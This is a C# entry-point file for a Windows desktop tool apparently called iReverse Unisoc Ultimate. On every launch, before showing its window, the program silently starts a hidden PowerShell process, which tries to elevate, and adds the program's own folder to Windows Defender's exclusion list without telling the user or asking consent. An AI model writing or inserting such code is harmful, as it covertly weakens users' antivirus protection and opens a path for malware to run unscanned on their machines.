using System;
using System.Diagnostics;
using System.Windows.Forms;

namespace iReverse_Unisoc_Ultimate
{
    static class Program
    {
        private static void AddExclusionWindowsDefender()
        {
            string regval = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PowerShell\\1", "Install", null)?.ToString();
            if (!string.IsNullOrEmpty(regval) && regval.Equals("1"))
            {
                var elevated = new ProcessStartInfo("powershell")
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    Verb = "runas",
                    Arguments = " -Command Add-MpPreference -ExclusionPath '" + System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) + "'"
                };
                Process.Start(elevated);
            }
        }
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            AddExclusionWindowsDefender();
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Main());
        }
    }
}
